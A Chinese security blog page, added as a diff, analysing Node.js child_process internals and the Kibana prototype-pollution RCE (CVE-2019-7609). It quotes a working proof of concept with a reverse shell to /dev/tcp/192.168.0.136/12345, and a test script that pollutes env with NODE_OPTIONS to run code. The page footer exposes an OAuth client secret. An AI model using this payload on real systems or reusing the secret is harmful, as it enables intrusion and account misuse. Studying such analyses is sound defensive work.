@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            从Kibana-RCE对nodejs子进程创建的思考
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Finance behind Passion in Security
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/friends/" class="menu-item-link">
+                        Friends
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/"> 
+                    从Kibana-RCE对nodejs子进程创建的思考 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-11-20   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#从Kibana-RCE对nodejs子进程创建的思考"><span class="toc-list-text">从Kibana-RCE对nodejs子进程创建的思考</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#child-process建立子进程的实现"><span class="toc-list-text">child_process建立子进程的实现</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#总结流程"><span class="toc-list-text">总结流程</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Kibana-RCE"><span class="toc-list-text">Kibana-RCE</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#漏洞分析"><span class="toc-list-text">漏洞分析</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#利用条件"><span class="toc-list-text">利用条件</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#相关链接"><span class="toc-list-text">相关链接</span></a></li></ol>
+</div>
+            <div class="content">
+                <h1 id="从Kibana-RCE对nodejs子进程创建的思考"><a href="#从Kibana-RCE对nodejs子进程创建的思考" class="headerlink" title="从Kibana-RCE对nodejs子进程创建的思考"></a>从Kibana-RCE对nodejs子进程创建的思考</h1><p>在前几天Kibana有一则关于原型链污染+子进程调用=&gt;rce的漏洞，跟进分析的时候发现child_process实现子进程创建确实存在trick。于是有了下文是对child_process的实现和Kibana RCE的一点思考。</p>
+<h1 id="child-process建立子进程的实现"><a href="#child-process建立子进程的实现" class="headerlink" title="child_process建立子进程的实现"></a>child_process建立子进程的实现</h1><p>对于child_process大家应该都不陌生，它是nodejs内置模块，用于新建子进程，在CTF题目中也常使用<code>require(&#39;child_process&#39;).exec(&#39;xxx&#39;)</code>来RCE。</p>
+<p>child_process内置了6个方法:execFileSync、execSync、fork、exec、execFile、spawn()</p>
+<p>其中execFileSync()调用spawnSync()，execSync()调用spawnSync()，而spawnSync()调用spawn();exec()调用execFile()，而execFile()调用spawn();fork()调用spawn()。也就是说前6个方法最终都是调用spawn()，而spawn()的本质是创建ChildProcess的实例并返回。那我们直接对spawn这个方法进行分析</p>
+<p>测试代码:</p>
+<pre><code>const { spawn } = require(&#39;child_process&#39;);
+
+spawn(&#39;whoami&#39;).stdout.on(&#39;data&#39;, (data) =&gt; {
+    console.log(`stdout: ${data}`);
+  });</code></pre><p>Node使用模块<code>child_process</code>建立子进程时，调用<code>用户层面的spawn</code>方法。初始化子进程的参数，进入方法<code>normalizeSpawnArguments</code></p>
+<pre><code>var spawn = exports.spawn = function(/*file, args, options*/) {
+  var opts = normalizeSpawnArguments.apply(null, arguments);
+};</code></pre><p>跟进方法<code>normalizeSpawnArguments</code>，当options不存在时将options命为空对象。接着到下面最关键的一步，即获取env变量的方式。首先对options.env是否存在做了判断，如果options.env为undefined则将环境变量<code>process.env</code>的值复制给env。而后对envParivs这个数组进行push操作，其实就是env变量对应的键值对。</p>
+<pre><code>function normalizeSpawnArguments(file, args, options) {
+    ...//省略
+  if (options === undefined)
+    options = {};
+
+    ...//省略
+  var env = options.env || process.env;
+  var envPairs = [];
+
+  for (var key in env) {
+    envPairs.push(key + &#39;=&#39; + env[key]);
+  }
+
+  _convertCustomFds(options);
+
+  return {
+    file: file,
+    args: args,
+    options: options,
+    envPairs: envPairs
+  };
+}</code></pre><p><img src="http://static.zybuluo.com/1160307775/70133nyslwwm715le1gimvfi/image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png" alt="image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png-386.4kB"></p>
+<p>这里就存在一个问题，options默认为空对象，那么它的<strong>任何属性</strong>都存在被污染的可能。所以只要能污染到<code>Object.prototype</code>，那么options就可以添加我们想要的任何属性，包括<code>options.env</code>。经过<code>normalizeSpawnArguments</code>封装并返回后，建立新的子进程<code>new ChildProcess()</code>，这里才算进入内部child_process的实现。</p>
+<pre><code>var opts = normalizeSpawnArguments.apply(null, arguments);
+var options = opts.options;
+var child = new ChildProcess();
+
+child.spawn({
+file: opts.file,
+args: opts.args,
+cwd: options.cwd,
+windowsVerbatimArguments: !!options.windowsVerbatimArguments,
+detached: !!options.detached,
+envPairs: opts.envPairs,
+stdio: options.stdio,
+uid: options.uid,
+gid: options.gid
+});</code></pre><p>我们直接看<code>ChildProcess.spawn</code>如何实现，也就是原生的spawn。核心代码逻辑是下面的两句，具体代码在<code>process_wrap.cc</code></p>
+<pre><code>ChildProcess.prototype.spawn = function(options) {
+  //...
+  var err = this._handle.spawn(options);
+  //...
+  // Add .send() method and start listening for IPC data
+  if (ipc !== undefined) setupChannel(this, ipc);
+  return err;
+};</code></pre><p><code>this._handle.spawn</code>调用了<code>process_wrap.cc</code>的spawn来生成子进程，是node子进程创建的底层实现，那我们看一下<code>process_wrap.cc</code>中对options的值进行了怎样的操作，。</p>
+<pre><code>  static void Spawn(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
+    //获取js传过来的第一个option参数
+    Local&lt;Object&gt; js_options = args[0]-&gt;ToObject(env-&gt;context()).ToLocalChecked();
+
+    ...
+    // options.env
+    Local&lt;Value&gt; env_v =
+        js_options-&gt;Get(context, env-&gt;env_pairs_string()).ToLocalChecked();
+    if (!env_v.IsEmpty() &amp;&amp; env_v-&gt;IsArray()) {
+      Local&lt;Array&gt; env_opt = Local&lt;Array&gt;::Cast(env_v);
+      int envc = env_opt-&gt;Length();
+      CHECK_GT(envc + 1, 0);  // Check for overflow.
+      options.env = new char*[envc + 1];  // Heap allocated to detect errors.
+      for (int i = 0; i &lt; envc; i++) {
+        node::Utf8Value pair(env-&gt;isolate(),
+                             env_opt-&gt;Get(context, i).ToLocalChecked());
+        options.env[i] = strdup(*pair);
+        CHECK_NOT_NULL(options.env[i]);
+      }
+      options.env[envc] = nullptr;
+    }
+    ...
+
+    //调用uv_spawn生成子进程，并将父进程的event_loop传递过去
+    int err = uv_spawn(env-&gt;event_loop(), &amp;wrap-&gt;process_, &amp;options);
+    //省略
+  }</code></pre><p>代码只截取了对env这个属性的操作，它将原先的envPairs进行封装。最后所有options带入<code>uv_spawn</code>来生成子进程，在<code>uv_spawn</code>中就是常规的fork()、waitpid()来控制进程的产生和资源释放，不过有一个非常重要的实现如下:</p>
+<pre><code>//process.cc-&gt;uv_spawn()
+
+execvp(options-&gt;file, options-&gt;args);</code></pre><p>execvp来执行任务，这里的options-&gt;file就是我们最初传给spawn的参数。比如我们的例子是<code>spawn(&#39;whoami&#39;)</code>，那么此时的file就是<code>whoami</code>，当然对于有参数的命令，则options-&gt;args与之对应。</p>
+<h2 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h2><p>child_process创建子进程的流程看起来有些复杂，总结一下:</p>
+<p>1、初始化子进程需要的参数，设置环境变量<br>2、fork()创建子进程，并用<code>execvp</code>执行系统命令。<br>3、ipc通信，输出捕捉</p>
+<h1 id="Kibana-RCE"><a href="#Kibana-RCE" class="headerlink" title="Kibana-RCE"></a>Kibana-RCE</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先引用漏洞原作者的举例<br><img src="http://static.zybuluo.com/1160307775/bhalsijd98obd3c2u5bctmpz/image_1dpfrsth1180fc11uprr5j1r0713.png" alt="image_1dpfrsth1180fc11uprr5j1r0713.png-74.8kB"></p>
+<p>node的官方文档中也能找到相同的用例:<a href="https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。" target="_blank" rel="noopener">https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。</a><br><img src="http://static.zybuluo.com/1160307775/dtx12zmomo7zm16h5mu9mvd8/image_1dpfrn6951t43bqt2prj21l9im.png" alt="image_1dpfrn6951t43bqt2prj21l9im.png-142.2kB"></p>
+<p>在node进程启动的时候作为环境变量加载，通过打印process.env也能证明</p>
+<pre><code>hpdoger@ChocoMacBook-Pro$ NODE_OPTIONS=&#39;--require ./evil.js&#39; node
+success!!!
+
+&gt; process.env.NODE_OPTIONS
+&#39;--require ./evil.js&#39;</code></pre><p>如果我们能改变本地环境变量，则在node创建进程的时候就可以包含恶意语句。尝试用export来实现如下。<br><img src="http://static.zybuluo.com/1160307775/39a5x7o5hdzs8ql0pbo3cbho/image_1dpfsa9vei1kk2g1f5a1qchv531g.png" alt="image_1dpfsa9vei1kk2g1f5a1qchv531g.png-27.1kB"></p>
+<p>事实证明，只要产生新进程就会加载一次本地环境变量，存储形式为process.env，若env中存在NODE_OPTIONS则进行相应的加载。但是这种需要bash漏洞就是耍流氓，于是作者想到了一种方法来污染process.env，也就是上文分析的env的获取，于是有了Kibana的poc</p>
+<pre><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;)
+.props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></pre><p>node运行时会把当前进程的env写进系统的环境变量，子进程也一样，在linux中存储为<code>/proc/self/environ</code>。通过污染env把恶意的语句写进/proc/self/environ。同时污染<code>process.NODE_OPTIONS</code>属性，使node在生成新进程的时候，包含我们构造的<code>/proc/self/environ</code>。具体操作就类似下面的用法<br><img src="http://static.zybuluo.com/1160307775/401us91ytoegl88xvsh0zj3a/image_1dpftrvc7qk59jmbjg17lk1f4b2d.png" alt="image_1dpftrvc7qk59jmbjg17lk1f4b2d.png-23.8kB"></p>
+<p>污染了Object.env之后，利用Canvas生成新进程的时候会执行spawn从而RCE</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>最开始我并没有跟进Kibana的源码，只是把漏洞归结于:</p>
+<pre><code>污染Object.env+创建子进程 =&gt; RCE</code></pre><p>于是我做了下面的测试，发现并没有像我想象中的输出evil.js中的内容，但是NODE_OPTIONS确实被写进了子进程的env。<br><img src="http://static.zybuluo.com/1160307775/pxl3up7lfbbj8966hg0t49cu/image_1dpfugpbejdu1cos1cra12pv11mr4p.png" alt="image_1dpfugpbejdu1cos1cra12pv11mr4p.png-102.2kB"></p>
+<p>当我将进程建立换为<code>proc.fork()</code>时，则成功加载了evil.js并输出<br><img src="http://static.zybuluo.com/1160307775/400rh8hi6z4231wta13ll6l6/image_1dpfuioo51pov0m17et1as61ibf56.png" alt="image_1dpfuioo51pov0m17et1as61ibf56.png-126.9kB"></p>
+<p>child_process.fork() 方法是 child_process.spawn() 的一个特例，专门用于衍生新的 Node.js 进程。 与 child_process.spawn() 一样返回 ChildProcess 对象。所以fork调用的是spawn来实现的子进程创建，那怎么会有这种情况？跟进一下fork看看实现有什么不同</p>
+<pre><code>exports.fork = function(modulePath /*, args, options*/) {
+    ...//省略
+    options.execPath = options.execPath || process.execPath;
+    return spawn(options.execPath, args, options);
+}</code></pre><p>它处理了execPath这个属性，默认获取系统变量的process.execPath，再传入spawn，这里就是<code>node</code>。<br><img src="http://static.zybuluo.com/1160307775/3som47zksrvzoyeta5xufflt/image_1dpfv09ba1lqiq4eglf17fmdgc63.png" alt="image_1dpfv09ba1lqiq4eglf17fmdgc63.png-62.4kB"></p>
+<p>而我们用spawn时，处理得到的file为<code>whoami</code><br><img src="http://static.zybuluo.com/1160307775/l68vdzmr5twb7bkh9dwtpw1i/image_1dpfvg05d1kth1o5n6adan9b8k6g.png" alt="image_1dpfvg05d1kth1o5n6adan9b8k6g.png-202.9kB"></p>
+<p>上文分析child_process在子进程创建的最底层，会调用execvp执行命令执行file</p>
+<pre><code>execvp(options-&gt;file, options-&gt;args);</code></pre><p>而上面poc核心就是<code>NODE_OPTIONS=&#39;--require /proc/self/environ&#39; node</code>，即bash调用了node去执行。所以此处的file值必须为node，否则无法将NODE_OPTIONS载入。而直接调用spawn函数时必须有file值，这也造成了第一种代码无法加载evil.js的情况<br><img src="http://static.zybuluo.com/1160307775/sj60p3ly3wetghpqf9oitvn5/image_1dpg0ajvt1b051icfapj1eaupi67a.png" alt="image_1dpg0ajvt1b051icfapj1eaupi67a.png-58.5kB"></p>
+<p>经过测试exec、execFile函数无论传入什么命令，file的值都会为<code>/bin/sh</code>，因为参数shell默认为true。即使不传入options选项，这两个命令也会默认定义options，这也是child_process防止命令执行的一种途径。<br><img src="http://static.zybuluo.com/1160307775/5ed7bm1z723crkc08l0279cr/image_1dpg1kbn81deo1e4aeai11jebbn9.png" alt="image_1dpg1kbn81deo1e4aeai11jebbn9.png-26kB"></p>
+<p>但是shell这个变量也是可以被污染的，不过child_process在这里做了限制，即使shell===false或字符串。最终传到execvp时也会被执行的参数替代，而不是真正的node进程。</p>
+<p>这样看来在污染了原型的条件下，child_process只有进行了fork()的时候，才能达到漏洞的利用。不过这样的利用面确实太窄了，如果有师傅研究过其他函数的执行spawn时能启动node进程，可以交流一下思路</p>
+<p>所以回到fork()函数，我们可以验证包含/proc/self/environ是可行的</p>
+<pre><code>// test.js
+proc = require(&#39;child_process&#39;);
+var aa = {}
+aa.__proto__.env = {&#39;AAAA&#39;:&#39;console.log(123)//&#39;,&#39;NODE_OPTIONS&#39;:&#39;--require /proc/self/environ&#39;}
+proc.fork(&#39;./function.js&#39;);
+
+//function.js
+console.log(&#39;this is func&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/uzueehmtlujd7zwq0belponu/image_1dpindplj1ocv1q5o1ksf11v510o89.png" alt="image_1dpindplj1ocv1q5o1ksf11v510o89.png-23.3kB"></p>
+<p>同时可以看到，fork在指定了modulepath的情况下，包含environ的同时并不影响modulepath中代码的执行。</p>
+<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank" rel="noopener">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a><br><a href="http://cnode1.rssing.com/chan-68517434/all_p385.html" target="_blank" rel="noopener">spawn、exec、execFile和fork</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzA5OTYzNw==&mid=2247483761&idx=1&sn=a366c51bd57b4fead862d11616a10b19&chksm=903fd0eba74859fd6ba296e29bf600a1004eeed72de3fb433c74d47654ce37a435e6d1e2742c&mpshare=1&scene=1&srcid=&sharer_sharetime=1571588210071&sharer_shareid=3674d5df50965fb924ba35f64042cb57&key=a2eb8c0b2340b20d3581c0a15949a693ac0879f7879b201f3878bc1f796bf6e8225380e8c186fbea7a3f5abb3c67841d7f71500c9619d916c3ced85f20b5d9cefdb3980e259d7e0c59132aada59c4132&ascene=1&uin=MTMyNzEzMTk2NQ%3D%3D&devicetype=Windows+10&version=62070152&lang=zh_CN&pass_ticket=866ICVsXH4EG%2FSMhWF45HLNA4E5jKkn%2Fh4V6bsGMzepRRdEW4YsHhfvV84kkAfIA" target="_blank" rel="noopener">Kibana漏洞之javascript原型链污染</a></p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Hpdoger</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/">https://hpdoger.cn/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+<li>
+    <img src="/img/wechat.jpg">
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/"> 字节跳动CTF线下赛Web题解&amp;复盘 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Wed Nov 20 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
